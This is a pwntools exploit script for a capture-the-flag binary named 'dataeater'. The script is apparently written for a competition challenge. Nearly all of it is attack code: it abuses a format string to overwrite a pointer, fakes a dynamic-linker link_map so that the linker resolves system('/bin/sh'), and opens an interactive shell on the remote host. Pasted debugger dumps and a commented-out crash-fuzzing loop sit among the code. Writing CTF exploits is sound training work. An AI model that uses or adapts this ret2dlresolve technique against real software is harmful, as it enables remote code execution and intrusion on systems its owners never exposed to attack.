#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template dataeater --host mc.ax --port 31869
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dataeater')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31869)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
tbreak *0x004006e6
#tbreak *0x004006fc
#tbreak __isoc99_scanf
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


scanf_addrs = """
*RAX  0x0
 RBX  0x400730 (__libc_csu_init) ◂— push   r15
*RCX  0xc172a3 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDX  0x0
*RDI  0x7ffe68b85c00 ◂— 0x7ffe000a7325 /* '%s\n' */
*RSI  0x601080 (buf) ◂— 0x0
*R8   0x7ffe68b85c00 ◂— 0x7ffe000a7325 /* '%s\n' */
*R9   0x7f024a49f720 (__memcpy_ssse3+7728) ◂— mov    dx, word ptr [rsi - 2]
*R10  0x63
*R11  0x7f024a4f39e0 ◂— 0xfffabb60fffab998
 R12  0x400560 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7ffe68b85c10 ◂— 0x0
*RSP  0x7ffe68b85bd8 —▸ 0x4006eb (main+164) ◂— mov    edx, 0x20
*RIP  0x400550 (__isoc99_scanf@plt) ◂— jmp    qword ptr [rip + 0x200ada]
"""

memset_addrs = """
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x1
 RBX  0x400730 (__libc_csu_init) ◂— push   r15
 RCX  0x0
 RDX  0x20
 RDI  0x601080 (buf) ◂— 'AAAAAAAA'
 RSI  0x0
 R8   0x0
 R9   0xffffffffffffff88
 R10  0x0
 R11  0x246
 R12  0x400560 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdf00 ◂— 0x0
 RSP  0x7fffffffded0 ◂— 0x0
 RIP  0x4006fc (main+181) ◂— call   0x400530
 
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffded0 ◂— 0x0
... ↓        2 skipped
03:0018│     0x7fffffffdee8 ◂— 0x100400560
04:0020│     0x7fffffffdef0 ◂— 0x7fff000a7325 /* '%s\n' */
05:0028│     0x7fffffffdef8 ◂— 0x841ff0de780f7a00
06:0030│ rbp 0x7fffffffdf00 ◂— 0x0
07:0038│     0x7fffffffdf08 —▸ 0x7ffff7e0e7ed (__libc_start_main+205) ◂— mov    edi, eax

"""

#io = start()

strtab_addr = 0x00400380
data_addr = 0x00601080
print(hex(data_addr - strtab_addr))

rop_ret = 0x000000000040050e
rop_pop_rdi = 0x0000000000400793

#rop = ROP(exe)
#rop.migrate(data_addr)
#print(rop.dump())
#exit()

_ = """rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol="system", args=["echo pwned"], data_addr=0x00601080)
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())"""


###
### Finding addresses of interest
### (From groups identified that 32 wasn't just a bad write to an address on stack or the null write)
_ = """for x in range(1,99):
	if os.path.exists('core'):
		os.remove('core')
	io = start()
	io.sendline(f"%{x}$s%s".encode('ascii'))
	io.sendline(b'A' * 128 + b' ' b'B' * 128+ b' ' b'C' * 128)
	io.wait()
	io.close()
	core = Core('core')
	print(x,hex(core.rip), hex(core.r12))
"""

def check_whitespace(buf):
	assert b' ' not in buf_data 
	assert b'\r' not in buf_data 
	assert b'\n' not in buf_data 
	assert b'\t' not in buf_data

l_libname = p64(exe.symbols['buf']+64) + p64(0) + p32(1) + p32(0)

buf_data = flat({
	0: b'/bin/sh\x00',
	32: p64(0) + p64(exe.symbols['buf']+48-55),
	48: b'system\x00', #p64(exe.symbols['buf']+56),
	56: b'system\x00',
	64: b'\x00',
	72: l_libname,
	#0: p64(exe.symbols['buf'])
}, length=128)

check_whitespace(buf_data)
_ = """
type = struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next;
    struct link_map *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
    struct libname_list *l_libname;
    Elf64_Dyn *l_info[77];
"""

#define DT_STRTAB        5                /* Address of string table */
#define DT_SYMTAB        6                /* Address of symbol table */
#define DT_PLTGOT        3                /* Processor defined value */
#define DT_JMPREL        23                /* Address of PLT relocs */

linkmap_data = (
	p64(0) + # l_addr
	p64(exe.symbols['buf']+64) + # l_name
	p64(0) + # l_ld
	p64(0) + p64(0) + # l_next, l_prev
	p64(0) + # l_real
	p64(0) + # l_ns
	p64(exe.symbols['buf']+72) + # l_libname
	p64(0) + # l_info[0]
	p64(0) + # l_info[1]
	p64(0x600f00) + # l_info[2]
	p64(0x600ef0) + # l_info[DT_PLTGOT]
	p64(0) + # l_info[4]
	p64(exe.symbols['buf']+32) + # l_info[DT_STRTAB]
	p64(0x600eb0) # l_info[DT_SYMTAB]
)

check_whitespace(buf_data)

print(buf_data)
print(buf_data.find(b'\xb8\x10'))
resolve_data = linkmap_data
check_whitespace(resolve_data)
io = start()
io.sendline(b"%s%32$s")
io.sendline(buf_data+b' '+resolve_data+b' b\n')


io.interactive()
